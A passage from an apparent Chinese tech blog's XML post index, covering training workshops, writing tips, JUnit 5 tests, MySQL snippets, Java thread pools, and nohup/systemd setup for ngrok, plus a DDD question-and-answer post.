title="参与人管理"></a>参与人管理</h2><ul><li><p>学员</p><ul><li>学员状态<ul><li>跟不上<ul><li>个别</li><li>整体<ul><li>教学内容</li><li>步子</li></ul></li></ul></li><li>不想学<ul><li>先沟通，再出去</li></ul></li><li>不够学<ul><li>额外的任务</li><li>突破舒适区的内容</li><li>分散精力：帮助他人</li></ul></li></ul></li><li>学员感受<ul><li>很累</li><li>压力大</li></ul></li></ul></li><li><p>客户</p><ul><li>可视化</li><li>每周总结</li><li>邀请参与</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 培训 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>一些写作技巧</title>
      <link href="/%E5%86%99%E4%BD%9C%E6%8A%80%E5%B7%A7/writing/writing-skils/"/>
      <url>/%E5%86%99%E4%BD%9C%E6%8A%80%E5%B7%A7/writing/writing-skils/</url>
      
        <content type="html"><![CDATA[<p>公司的内部刊物发表了很多技术和商业相关的文章，很多时候读起来非常晦涩。相比之下一些公众号的文章读起来特别轻松，通过分析公众号爆款文章的后，发现一些有意思的特点。</p><ul><li>倪匡说过文章首先是读起来有意思，再是有道理的，再是有用的</li><li>内容具有普适性，越通俗、接地气的文章看得人越多，那些专业的计算机、财务相关的文章一般没人看，倒是大众心理学、情感类的文章传播的非常迅速</li><li>分享知识的文章不如讲道理的文章；讲道理的文章不如讲故事的文章</li><li>目标受众越明确越好，越能击中读者的内心</li><li>一篇文章应该解决某个领域的问题，尽量是内容的呈现而非讲道理式的泛泛而谈</li></ul><h3 id="写作内容的来源"><a href="#写作内容的来源" class="headerlink" title="写作内容的来源"></a>写作内容的来源</h3><ul><li>问题收集和采访<ul><li>这点非常重要，很多问题不要干想，把内容写下来然后提问，找到熟悉的人采访然后提取好的内容</li></ul></li><li>从外文获取资料，并翻译成自己的文字</li><li>平时看的技术资料整理<ul><li>拆书</li><li>视频教程</li><li>讲座笔记</li></ul></li><li>工作、生活上遇到的问题和方案整理<ul><li>使用头脑风暴进行问题分析</li><li>可以使用调查的方式发现问题，然后请教专业的人，并在文章中解决</li></ul></li></ul><h2 id="对写作类型进行分类"><a href="#对写作类型进行分类" class="headerlink" title="对写作类型进行分类"></a>对写作类型进行分类</h2><ul><li>传播知识和总结的文章</li><li>讲述道理和个人感悟的文章</li><li>通过故事传达某个理念的文章</li></ul><h2 id="文章的结构的设计"><a href="#文章的结构的设计" class="headerlink" title="文章的结构的设计"></a>文章的结构的设计</h2><ul><li>三段论是经典的作文结构。通过点题说明文章主旨，吸引读者继续阅读；其次分段阐述论点，其中穿插一些故事或者引用作为证据证明；最后总结，回顾全文。</li></ul><h2 id="其他奇巧淫技"><a href="#其他奇巧淫技" class="headerlink" title="其他奇巧淫技"></a>其他奇巧淫技</h2><ul><li>总结不要用“总结”这个标题，让结尾更为自然</li><li>文章的开始可以埋一些伏笔，就像相声的抖包袱</li><li>文章是改出来的，不是一次成型的</li></ul><h2 id="文章的几个层次"><a href="#文章的几个层次" class="headerlink" title="文章的几个层次"></a>文章的几个层次</h2><ul><li>文章的灵魂是逻辑</li><li>文章的骨骼是结构</li><li>文章的案例和陈述是肉</li><li>文章的格式和错误是皮</li></ul><h2 id="文体分类"><a href="#文体分类" class="headerlink" title="文体分类"></a>文体分类</h2><p>目前文体分类不是特别严格，并且争议比较大。但是对文体进行分类对写作的特征更有帮助。</p><ul><li>议论文<ul><li>用来表达观点，应使用强有力的论据和逻辑支撑。毛主席的《实践论》，这种文章很容易具有煽动性。</li><li>参考文章<ul><li>《超越云计算：对数据库管理系统未来的思考》<a href="https://www.infoq.cn/article/MrCVHNFtHqt-VXYWisEd" target="_blank" rel="noopener">https://www.infoq.cn/article/MrCVHNFtHqt-VXYWisEd</a></li><li>《你要专业》 <a href="https://mp.weixin.qq.com/s/JwDKYOW4XRwQZa4ybEwOFA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/JwDKYOW4XRwQZa4ybEwOFA</a></li><li>《香港问题的终极归因》<a href="https://mp.weixin.qq.com/s/J8xzOwrezz6NHCVGvROvTQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/J8xzOwrezz6NHCVGvROvTQ</a></li></ul></li></ul></li><li>应用文<ul><li>书信等</li></ul></li><li>说明文<ul><li>陈述技术方案，IT行业最常见的写作问题。写作手法主要是 what why how。标题往往是对xxx的介绍。</li><li>参考文章<ul><li>《可视化架构设计——C4介绍》<a href="https://mp.weixin.qq.com/s/cy-b_Vu9oBz7TrOIaJTADg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/cy-b_Vu9oBz7TrOIaJTADg</a></li><li>《坐看云起时，谈笑无还期》<a href="https://mp.weixin.qq.com/s/QCnclsGw-FCaXPMH7QcgcQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/QCnclsGw-FCaXPMH7QcgcQ</a></li><li>《为什么都2019年了大家还喜欢用 TypeScript》<a href="https://mp.weixin.qq.com/s/edt5QplvGxqfGl-oDC5m3g" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/edt5QplvGxqfGl-oDC5m3g</a></li></ul></li></ul></li><li>教程<ul><li>教授一个明确的内容, 例如《Java 8 中的 Streams API 详解》 <a href="https://www.ibm.com/developerworks/cn/java/j-lo-java8streamapi/" target="_blank" rel="noopener">https://www.ibm.com/developerworks/cn/java/j-lo-java8streamapi/</a></li></ul></li><li>杂文</li></ul><h2 id="写作手法"><a href="#写作手法" class="headerlink" title="写作手法"></a>写作手法</h2><ul><li>讲故事</li><li>引用数据</li><li>介绍案例</li><li>引用名言</li></ul><h2 id="写作的本质"><a href="#写作的本质" class="headerlink" title="写作的本质"></a>写作的本质</h2><ul><li>写作的本质是逻辑+表达。文艺作品表达生动具体，文章的可读性和吸引力强，但是逻辑不明显或者不强。程序员写东西反过来了,程序员的文章往往具有很强的结构性和逻辑性，但是不够具体和生动，表达不是特别专业。</li><li>普通文体写作不是写论文，一定要自己的新研究和发现，可以是从其他地方汇集素材而成。</li><li>写作的本质是资料的索引，因此切忌独自战斗，尽量从多个途径汇集资料素材。</li></ul><h2 id="模仿文章"><a href="#模仿文章" class="headerlink" title="模仿文章"></a>模仿文章</h2><ul><li><p>社论文章</p><ul><li>《实践论》 - 毛泽东<a href="https://baike.baidu.com/item/实践论/4651899?fr=aladdin" target="_blank" rel="noopener">https://baike.baidu.com/item/%E5%AE%9E%E8%B7%B5%E8%AE%BA/4651899?fr=aladdin</a></li></ul></li><li><p>技术文章</p><ul><li>阮一峰</li></ul></li><li>老钱的掘金小册 <a href="https://juejin.im/book/5afc2e5f6fb9a07a9b362527/section/5b336601f265da598e13f917" target="_blank" rel="noopener">https://juejin.im/book/5afc2e5f6fb9a07a9b362527/section/5b336601f265da598e13f917</a></li></ul><h2 id="流程化写作方法"><a href="#流程化写作方法" class="headerlink" title="流程化写作方法"></a>流程化写作方法</h2><p>流程化写作的目的是解决快速高质量有效产出的问题，核心思想还是做到将平时收集的观点、内容快速输出，做到文章言之有物。</p><p>基本流程：</p><ol><li>确立文章主题，和解决的问题，确定文章看点</li><li>30分钟内，大量搜索中英文相关资料</li><li>按照技术文章协作模板，1 小时内完成写作绘图</li><li>10分钟内完成第一轮校对</li><li>20分钟内完成第二轮校对</li></ol><p>总流程应该在 2 小时内完成。</p><p>技术文章模型：</p><ol><li>提出问题，该文章解决了什么问题，放到第一段</li><li>给予事实、案例、论证</li><li>总结回答问题，作为 takeaway 带走</li></ol>]]></content>
      
      
      <categories>
          
          <category> 写作技巧 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Junit 5</title>
      <link href="/%E8%B4%A8%E9%87%8F%E4%BF%9D%E8%AF%81/test/junit-5/"/>
      <url>/%E8%B4%A8%E9%87%8F%E4%BF%9D%E8%AF%81/test/junit-5/</url>
      
        <content type="html"><![CDATA[<h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><h3 id="用Junit5-测试-controller-或者API的例子"><a href="#用Junit5-测试-controller-或者API的例子" class="headerlink" title="用Junit5 测试 controller 或者API的例子"></a>用Junit5 测试 controller 或者API的例子</h3><pre><code class="java">package com.tw.api.unit.test.controller;import com.tw.api.unit.test.domain.todo.Todo;import com.tw.api.unit.test.domain.todo.TodoRepository;import org.junit.jupiter.api.Test;import org.junit.jupiter.api.extension.ExtendWith;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.boot.test.autoconfigure.web.servlet.WebMvcTest;import org.springframework.boot.test.mock.mockito.MockBean;import org.springframework.test.context.ActiveProfiles;import org.springframework.test.context.junit.jupiter.SpringExtension;import org.springframework.test.web.servlet.MockMvc;import org.springframework.test.web.servlet.ResultActions;import java.util.Arrays;import static org.hamcrest.Matchers.is;import static org.mockito.Mockito.when;import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;import static org.springframework.test.web.servlet.result.MockMvcResultHandlers.print;import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.jsonPath;import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;@ExtendWith(SpringExtension.class)@WebMvcTest(TodoController.class)@ActiveProfiles(profiles = &quot;test&quot;)class TodoControllerTest {    @Autowired    private TodoController todoController;    @Autowired    private MockMvc mvc;    @MockBean    private TodoRepository todoRepository;    @Test    void getAll() throws Exception {        //given        when(todoRepository.getAll()).thenReturn(Arrays.asList(new Todo(1,&quot;first todo&quot;,true,0)));        //when        ResultActions result = mvc.perform(get(&quot;/todos&quot;));        //then        result.andExpect(status().isOk())                .andDo(print())                .andExpect(jsonPath(&quot;$[0].title&quot;, is(&quot;first todo&quot;)))                .andExpect(jsonPath(&quot;$[0].id&quot;, is(1)))                .andExpect(jsonPath(&quot;$[0].completed&quot;, is(true)))                .andExpect(jsonPath(&quot;$[0].order&quot;, is(0)));    }}</code></pre><h3 id="用Junit5测试service的例子"><a href="#用Junit5测试service的例子" class="headerlink" title="用Junit5测试service的例子"></a>用Junit5测试service的例子</h3><pre><code class="java">package com.tw.api.unit.test.services;import org.junit.jupiter.api.BeforeEach;import org.junit.jupiter.api.DisplayName;import org.junit.jupiter.api.Test;import org.junit.jupiter.api.extension.ExtendWith;import org.mockito.InjectMocks;import org.mockito.Mock;import org.mockito.junit.jupiter.MockitoExtension;import static org.junit.jupiter.api.Assertions.assertEquals;import static org.mockito.Mockito.when;@ExtendWith(MockitoExtension.class)@DisplayName(&quot;A example to test show service with mock strategy&quot;)public class ShowServiceTests {    private static final String MOCK_OUTPUT = &quot;Mocked show label&quot;;    @Mock    private TextService textService;    @InjectMocks    private ShowService showService;    @BeforeEach    void setMockOutput() {        when(textService.getText()).thenReturn(MOCK_OUTPUT);    }    @Test    @DisplayName(&quot;Mock the output of the text service using mockito&quot;)    public void contextLoads() {        assertEquals(showService.getShowLabel(), MOCK_OUTPUT);    }}</code></pre><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://www.ibm.com/developerworks/cn/java/j-introducing-junit5-part1-jupiter-api/index.html" target="_blank" rel="noopener">https://www.ibm.com/developerworks/cn/java/j-introducing-junit5-part1-jupiter-api/index.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 质量保证 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>如何交付一场满意的工作坊</title>
      <link href="/%E5%9F%B9%E8%AE%AD/training/how-to-delivery-a-workshop/"/>
      <url>/%E5%9F%B9%E8%AE%AD/training/how-to-delivery-a-workshop/</url>
      
        <content type="html"><![CDATA[<h2 id="有价值的地方"><a href="#有价值的地方" class="headerlink" title="有价值的地方"></a>有价值的地方</h2><p>讲师价值在哪里，为什么我们能卖的如此贵。</p><ul><li>内容</li><li>工作坊活动</li><li>启发式赋能</li></ul><h2 id="培训师的几项思考帽"><a href="#培训师的几项思考帽" class="headerlink" title="培训师的几项思考帽"></a>培训师的几项思考帽</h2><ul><li>教练</li><li>讲师</li><li>训练员</li><li>推动者</li></ul><h2 id="培训的几个要素"><a href="#培训的几个要素" class="headerlink" title="培训的几个要素"></a>培训的几个要素</h2><ul><li>场地<ul><li>在场地上布置一些标志性的东西来烘托氛围<ul><li>海报</li><li>agenda</li></ul></li></ul></li><li>物料<ul><li>扑克牌用于计分</li></ul></li><li>内容<ul><li>课程像一串珠子，但应该只有一根线</li></ul></li><li>氛围<ul><li>沉浸式的表演<ul><li>内容</li><li>形式</li></ul></li><li>人<ul><li>合适的着装</li><li>充满热情</li><li>面带微笑</li><li>风趣幽默</li><li>身体运动</li></ul></li><li>事<ul><li>讲个笑话</li><li>故事</li><li>热点话题</li><li>提问</li><li>案例分析</li><li>播放视频，一些电影片段</li><li>玩个游戏</li><li>设置奖励</li></ul></li><li>冲突<ul><li>学员意见不一致是好事</li><li>故意制造一些冲突</li></ul></li><li>收尾 - 峰终理论<ul><li>gallery walk</li><li>彩虹贴，通过</li><li>寄语</li><li>仪式感的颁奖</li><li>合照</li><li>Team building</li></ul></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 培训 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>实用的SQL语句技巧</title>
      <link href="/mysql/mysql/useful-mysql%20statement/"/>
      <url>/mysql/mysql/useful-mysql%20statement/</url>
      
        <content type="html"><![CDATA[<p>使用SQL完成文本替换操作</p><blockquote><p>update typecho_contents set text=REPLACE (addr,’<a href="http://bcs.duapp.com/helpjs&#39;,&#39;http://helpjs.bj.bcebos.com/&#39;" target="_blank" rel="noopener">http://bcs.duapp.com/helpjs&#39;,&#39;http://helpjs.bj.bcebos.com/&#39;</a>)</p></blockquote><p>表之间复制数据,可以使用 select into table1(field1,field2) select (value1,value2) from table2</p><blockquote><p> insert into user_temp(id,phone_nbr,open_id,project_from,task_id)<br>           select id,phone_nbr,open_id,project_from,task_id from user where task_id=#{taskId}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>mysql 存储过程编写示例</title>
      <link href="/mysql/mysql/mysql-stored-procedure/"/>
      <url>/mysql/mysql/mysql-stored-procedure/</url>
      
        <content type="html"><![CDATA[<h2 id="一个创建模拟数据的存储过程"><a href="#一个创建模拟数据的存储过程" class="headerlink" title="一个创建模拟数据的存储过程"></a>一个创建模拟数据的存储过程</h2><pre><code class="mysql">DROP PROCEDURE IF EXISTS `insertStubData`;DELIMITER $$CREATE PROCEDURE `insertStubData`()BEGIN    DECLARE i int unsigned DEFAULT 0;    WHILE i &lt; 30000 DO        SET i = i+1;        INSERT INTO `sso_login`(`id`,        `phone_nbr`,        `open_id`,        `project_from`,        `task_id`)        VALUES        (null,CONCAT(&quot;133&quot;,i),i,&quot;TW&quot;,10);    END WHILE;END $$DELIMITER ;CALL insertStubData();</code></pre><h2 id="编写-mysql-存储过程的基础"><a href="#编写-mysql-存储过程的基础" class="headerlink" title="编写 mysql 存储过程的基础"></a>编写 mysql 存储过程的基础</h2><ul><li>基本教程 <a href="https://www.runoob.com/w3cnote/mysql-stored-procedure.html" target="_blank" rel="noopener">https://www.runoob.com/w3cnote/mysql-stored-procedure.html</a></li></ul><h2 id="一些注意事项"><a href="#一些注意事项" class="headerlink" title="一些注意事项"></a>一些注意事项</h2><ul><li>定义变量需要和SQL保持一致</li><li>使用 SET 为变量赋值</li></ul>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Jmeter 性能测试</title>
      <link href="/%E8%B4%A8%E9%87%8F%E4%BF%9D%E8%AF%81/test/Jmeter/"/>
      <url>/%E8%B4%A8%E9%87%8F%E4%BF%9D%E8%AF%81/test/Jmeter/</url>
      
        <content type="html"><![CDATA[<p>Apache JMeter是一款纯java编写负载功能测试和性能测试开源工具软件。相比Loadrunner而言，JMeter小巧轻便且免费，逐渐成为了主流的性能测试工具，是每个测试人员都必须要掌握的工具之一。</p><h2 id="安装方式"><a href="#安装方式" class="headerlink" title="安装方式"></a>安装方式</h2><p>Jmeter 使用 Jar 发布，需要 java 运行环境，无需专门安装。<br>下载地址：<a href="http://jmeter.apache.org/download_jmeter.cgi" target="_blank" rel="noopener">http://jmeter.apache.org/download_jmeter.cgi</a></p><h2 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h2><p>下面是一个测试 web 访问的基本例子：</p><ol><li>“测试计划” -&gt; “添加” -&gt; “Threads(Users)” -&gt; “线程组”，配置线程数量、时长、循环次数等。</li><li>“线程组” -&gt; “添加” -&gt; “Sampler” -&gt; “HTTP请求”  创建一个HTTP请求的示例</li><li>“线程组” -&gt; “添加” -&gt; “监听器” -&gt; “察看结果树” 创建一个查看结果的方式，可以选择图形、断言等其他方式</li><li>运行测试</li></ol><p>Jmeter还可以创建变量等更高级的方式。</p><ul><li>介绍文档 <a href="https://blog.csdn.net/u012111923/article/details/80705141" target="_blank" rel="noopener">https://blog.csdn.net/u012111923/article/details/80705141</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 质量保证 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Java 内存分析工具 VisualVM</title>
      <link href="/java/java/java%20visualVM/"/>
      <url>/java/java/java%20visualVM/</url>
      
        <content type="html"><![CDATA[<p>VisualVM 是一款非常简单的分析 java 内存的开源软件，由Apache 开源发布。</p><p>它通过 jvmstat、JMX、SA（Serviceability Agent）以及 Attach API 等多种方式从程序运行时获得实时数据，从而进行动态的性能分析。</p><p>提供了如下功能</p><ul><li>内存分析</li><li>CPU 分析</li><li>线程分析</li><li>转储功能</li><li>堆转储的生成与分析</li><li>远程分析</li></ul><p>VisualVM 使用非常简单，如果Java项目出现内存问题，可以使用该工具调试。</p><h2 id="参考地址"><a href="#参考地址" class="headerlink" title="参考地址"></a>参考地址</h2><ul><li>介绍 <a href="https://www.ibm.com/developerworks/cn/java/j-lo-visualvm/index.html" target="_blank" rel="noopener">https://www.ibm.com/developerworks/cn/java/j-lo-visualvm/index.html</a></li><li>官网 <a href="https://visualvm.github.io/" target="_blank" rel="noopener">https://visualvm.github.io/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Java 线程池使用</title>
      <link href="/java/java/java%20thread%20pool/"/>
      <url>/java/java/java%20thread%20pool/</url>
      
        <content type="html"><![CDATA[<p>在计算密集型的项目中，需要用到多线程来做并发操作，java 多线程最好的方案就是使用线程池。<br>可以通过使用 Spring 中封装好的线程池类，也可以使用 Java 原生接口。</p><h2 id="使用-Spring-中ThreadPoolTaskExecutor实现线程池"><a href="#使用-Spring-中ThreadPoolTaskExecutor实现线程池" class="headerlink" title="使用 Spring 中ThreadPoolTaskExecutor实现线程池"></a>使用 Spring 中ThreadPoolTaskExecutor实现线程池</h2><p>如果项目中已经存在 Spring 则可以使用一个由Spring 封装好了的线程池单例</p><p>声明下面 Bean</p><pre><code>@Configurationpublic class ThreadPoolConfig {    @Bean(&quot;threadPoolTaskExecutor&quot;)    public ThreadPoolTaskExecutor threadPoolTaskExecutor(){        ThreadPoolTaskExecutor threadPoolTaskExecutor=new ThreadPoolTaskExecutor();        threadPoolTaskExecutor.setCorePoolSize(4);        threadPoolTaskExecutor.setKeepAliveSeconds(10);        threadPoolTaskExecutor.setMaxPoolSize(10);        threadPoolTaskExecutor.setQueueCapacity(10);        return threadPoolTaskExecutor;    }}</code></pre><p>创建一个测试的线程类，继承 Thread 或者实现 Runnable 都可</p><pre><code>public class MyThread extends Thread {    @Override    publicvoid run() {        System.out.println(Thread.currentThread().getName() + &quot;正在执行。。。&quot;);    }}</code></pre><p>在需要使用的地方只需要注入 Bean，然后执行任务即可</p><pre><code>@AutowiredThreadPoolTaskExecutor threadPoolTaskExecutor;threadPoolTaskExecutor.execute(new MyThread());</code></pre><h2 id="使用-Java-原生接口"><a href="#使用-Java-原生接口" class="headerlink" title="使用 Java 原生接口"></a>使用 Java 原生接口</h2><p>在 Java 中，原生的线程池接口为 ExecutorService。Executors 默认提供了数个实现，其中创建固定的线程个数的线程池比较常用 newFixedThreadPool。</p><pre><code>ExecutorService executor = Executors.newFixedThreadPool(10);executor.execute(new MyThread());executor.shutdown;</code></pre><p>需要特别注意的是，线程池中的线程不会被自动释放，需要自己手动调用 shutdown 释放。</p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>nohup 后台运行Linux程序方法</title>
      <link href="/linux/linux/linux-nohup/"/>
      <url>/linux/linux/linux-nohup/</url>
      
        <content type="html"><![CDATA[<p>在Linux服务器中，每个终端的应用程序会随着用户的退出被杀死。如果在用户退出也需要继续运行的话，需要使用nohup 来运行程序。</p><p>同时,nohup 并不是后台运行，意味着虽然用户退出终端可以继续运行，但是在退出之前会占用用户界面。</p><p>于是可以使用在命令后添加 &amp; 符号的方法，让程序到后台运行。</p><p>在部署服务器应用时，我们可以即可 nohup 和 &amp; 来运行程序。</p><p>例如：</p><blockquote><p>/usr/bin/nohup /home/hp/workspace/ngrok tcp 80 -log=stdout &amp;</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Systemd 常见用法</title>
      <link href="/linux/linux/linux-systemd/"/>
      <url>/linux/linux/linux-systemd/</url>
      
        <content type="html"><![CDATA[<p>Systemd 是一套用来管理系统服务的命令，Cent OS默认使用它管理系统服务。</p><h2 id="Systemd-命令组用法"><a href="#Systemd-命令组用法" class="headerlink" title="Systemd 命令组用法"></a>Systemd 命令组用法</h2><p>参考 <a href="http://www.ruanyifeng.com/blog/2016/03/systemd-tutorial-part-two.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2016/03/systemd-tutorial-part-two.html</a></p><h2 id="Systemd-servcie-文件编写"><a href="#Systemd-servcie-文件编写" class="headerlink" title="Systemd servcie 文件编写"></a>Systemd servcie 文件编写</h2><p>参考 <a href="https://www.cnblogs.com/wutao666/p/9781567.html" target="_blank" rel="noopener">https://www.cnblogs.com/wutao666/p/9781567.html</a></p><h2 id="一个注册-ngrok-（内网穿透工具）-的实例"><a href="#一个注册-ngrok-（内网穿透工具）-的实例" class="headerlink" title="一个注册 ngrok （内网穿透工具） 的实例"></a>一个注册 ngrok （内网穿透工具） 的实例</h2><ol><li>编写ngrok.servcie 服务文件</li></ol><pre><code>[Unit]Description=&quot;Ngrok service &quot;After=network.target[Service]Type=forkingExecStart=/usr/bin/nohup /home/hp/workspace/ngrok tcp 80 -log=stdout &amp;ExeStart=ps -ef | grep ngrok | head -1 | awk &#39;{print $2}&#39; |xargs kill -9 KillSignal=SIGQUITTimeoutStopSec=5KillMode=processPrivateTmp=true[Install]WantedBy=multi-user.target</code></pre><ol start="2"><li>拷贝服务文件到系统指定目录</li></ol><blockquote><p>sudo cp ngrok.service /etc/systemd/system</p></blockquote><ol start="3"><li>加载到系统中</li></ol><blockquote><p>sudo systemctl daemon-reload</p></blockquote><ol start="4"><li>启动服务</li></ol><blockquote><p>sudo systemctl start ngrok.service</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>DDD 常见问题</title>
      <link href="/%E7%90%86%E8%AE%BA%E6%96%B9%E6%B3%95/methodology/QA-for-DDD/"/>
      <url>/%E7%90%86%E8%AE%BA%E6%96%B9%E6%B3%95/methodology/QA-for-DDD/</url>
      
        <content type="html"><![CDATA[<h2 id="领域驱动基础知识"><a href="#领域驱动基础知识" class="headerlink" title="领域驱动基础知识"></a>领域驱动基础知识</h2><h3 id="DDD解决了什么问题？"><a href="#DDD解决了什么问题？" class="headerlink" title="DDD解决了什么问题？"></a>DDD解决了什么问题？</h3><p>DDD 解决对复杂应用建模的问题。DDD 是一套设计方法和思想，而非具体的编程实践。应该区别于TDD、BDD 等名词。</p><h3 id="DDD的三原则是什么？如果让你讲，你会怎么讲解这三个原则？（举一个符合的例子，一个不符合的例子）"><a href="#DDD的三原则是什么？如果让你讲，你会怎么讲解这三个原则？（举一个符合的例子，一个不符合的例子）" class="headerlink" title="DDD的三原则是什么？如果让你讲，你会怎么讲解这三个原则？（举一个符合的例子，一个不符合的例子）"></a>DDD的三原则是什么？如果让你讲，你会怎么讲解这三个原则？（举一个符合的例子，一个不符合的例子）</h3><pre><code>1. 聚焦核心领域设计一个应用系统，应该只关注业务的核心问题，其他必要的附属问题应该围绕支撑核心问题来处理。例如垂直电商（也买网）的业务核心在让用户能快速发现专业供应商提供的产品，重点在商品检索上。但是会员系统是业务必须要要求的，所以用户系统则应该为主要业务服务，应该把资源投入到核心领域中。1. 通过协作迭代式探索模型整个团队中每个人的信息都是局部的，想要建立一个大的图景，自上而下的规划设计在软件开发中是很困难的（软件开发的固有特点就是不确定性和变化）。通过领域专家、工程师一起探索识别系统中存在的业务需求、现实情况、外部依赖等知识，不断完善模型。1. 使⽤用统⼀一语⾔DDD 需要领域专家和工程师、QA、UX 等协作建模，在不同的上下文中不同的名词代表的含义不一样，例如一个报销系统中 bill、ticket 都有单据的含义，但是bill可能指消费的账单，ticket 指在系统中提交的包含bill的工单。同样也需要统一技术语言和业务语言。领域专家眼里的“流程图”和工程师眼中的“流程图”有时候非常不一样。</code></pre><h3 id="DDD的元模型是什么？"><a href="#DDD的元模型是什么？" class="headerlink" title="DDD的元模型是什么？"></a>DDD的元模型是什么？</h3><p>TBD</p><h3 id="DDD不适合做什么？（举一个适合的例子，一个不适合的例子）"><a href="#DDD不适合做什么？（举一个适合的例子，一个不适合的例子）" class="headerlink" title="DDD不适合做什么？（举一个适合的例子，一个不适合的例子）"></a>DDD不适合做什么？（举一个适合的例子，一个不适合的例子）</h3><p>DDD 适合用于复杂业务建模，如果项目比较简单，不适合使用DDD来设计。同理 DDD 会带来成本，在这些成本接受范围之外的组织也不适合使用DDD。</p><h3 id="DDD为什么又火了？"><a href="#DDD为什么又火了？" class="headerlink" title="DDD为什么又火了？"></a>DDD为什么又火了？</h3><p>DDD 是一个原本就存在的概念，微服务发展的原因需要一个方法论支撑服务划分。DDD 和微服务的出发点都是从业务视角分离复杂度，因此DDD被社区内当做微服务的实践之一。</p><h3 id="银弹的定义是什么？银弹跟DDD有什么关系？"><a href="#银弹的定义是什么？银弹跟DDD有什么关系？" class="headerlink" title="银弹的定义是什么？银弹跟DDD有什么关系？"></a>银弹的定义是什么？银弹跟DDD有什么关系？</h3><p>软件工程自身的复杂性和变化性，导致软件开发过程里是没有万能的终杀性武器的，只有各种方法综合运用，才是解决之道。DDD 不是银弹，DDD 只能解决特定的问题，而不是万能的，只有再适合使用DDD的地方使用合理运用才能发挥DDD的价值。</p><h3 id="DDD跟Design-Thinking怎么关联？"><a href="#DDD跟Design-Thinking怎么关联？" class="headerlink" title="DDD跟Design Thinking怎么关联？"></a>DDD跟Design Thinking怎么关联？</h3><p>Design thinking 设计思维是一种通过角色扮演活动、工作坊、头脑风暴等方式促进学习的方法，在DDD 中需要团队领域专家、工程师和其他角色共通参与建模，工作坊和头脑风暴是一种非常好的方式。</p><h2 id="聚焦核心领域"><a href="#聚焦核心领域" class="headerlink" title="聚焦核心领域"></a>聚焦核心领域</h2><h3 id="子域有哪三类，通常分别采用什么样的策略处理？（举两个策略不同的例子）"><a href="#子域有哪三类，通常分别采用什么样的策略处理？（举两个策略不同的例子）" class="headerlink" title="子域有哪三类，通常分别采用什么样的策略处理？（举两个策略不同的例子）"></a>子域有哪三类，通常分别采用什么样的策略处理？（举两个策略不同的例子）</h3><pre><code>- 核⼼子域指业务成功的主要促成因素，是企业的核⼼竞争力。一般一个系统只存在一个核心子域，并应该投入最好的资源到这个领域。核心子域应该作为企业的核心竞争力。- 支撑子域不是核⼼，不被整个系统使⽤，完成业务的必要能力，但不是业务成功的原因。例如电商系统中，会员系统必不可少但是应该作为支撑订单等业务来考虑；而社交应用中会员系统是作为核心竞争力对待的，但是也会有电商模块作为支撑。- 通⽤子域不是核心，但被整个业务系统所使用，通用子域可以看做特殊的支撑子域。通用子域可以使用业界主流通用方案，例如文件服务、通知服务、推送、舆情等。甚至可以考虑购买更专业企业提供的服务。</code></pre><h3 id="产品愿景与价值定位有什么用？"><a href="#产品愿景与价值定位有什么用？" class="headerlink" title="产品愿景与价值定位有什么用？"></a>产品愿景与价值定位有什么用？</h3><p>对产品的顶层价值设计，对产品⽬目标⽤用户、核⼼心价值、差异化竞争点、痛点等策略略层信息在团队层⾯达成共识。用于对领域划分提供依据，例如微信可能有做支付的想法，支付宝有做社交的想法，但微信的支付和支付宝的社交都应为他们的价值定位不可能作为核心领域考虑。</p><h3 id="产品定位的电梯演讲是什么结构？写一个与你的练习无关例子。"><a href="#产品定位的电梯演讲是什么结构？写一个与你的练习无关例子。" class="headerlink" title="产品定位的电梯演讲是什么结构？写一个与你的练习无关例子。"></a>产品定位的电梯演讲是什么结构？写一个与你的练习无关例子。</h3><p>例子1 </p><p><strong> 对于 </strong> 基于RESTful 前后端协作</p><p><strong> 它们想 </strong> 自动化生成文档，便于前端使用</p><p><strong> 这个 </strong> 文档生成器</p><p><strong> 是一个 </strong>  通过对Java 代码注解分析，导出文档的工具</p><p><strong> 它可以 </strong> 在编译部署时自动生成一个在线的API文档</p><p><strong> 不同于 </strong> 常用的文档编辑工具</p><p><strong> 我们的工具 </strong> 可以自动生成和更新API文档</p><p>例子2</p><p><strong> 对于 </strong> 没有时间洗衣服的白领</p><p><strong> 它们想 </strong> 购买能提供上门收件的洗衣服务</p><p><strong> 这个 </strong> XXX洗衣助手</p><p><strong> 是一个 </strong>  在线送洗衣物的APP</p><p><strong> 它可以 </strong> 提供在线下单，上门收件的服务</p><p><strong> 不同于 </strong> 常规洗衣店</p><p><strong> 我们的产品 </strong> 